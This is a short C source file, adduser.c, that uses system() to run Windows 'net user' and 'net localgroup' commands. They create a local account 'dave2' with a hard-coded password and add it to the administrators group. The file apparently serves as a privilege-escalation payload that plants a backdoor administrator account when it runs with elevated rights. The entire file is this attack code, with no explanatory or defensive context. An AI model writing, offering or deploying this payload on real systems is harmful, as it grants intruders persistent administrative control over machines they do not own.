/* adduser.c */
#include <stdlib.h>
int main() {
  system("net user dave2 Password123! /add");
  system("net localgroup administrators dave2 /add");
  return 0;
}
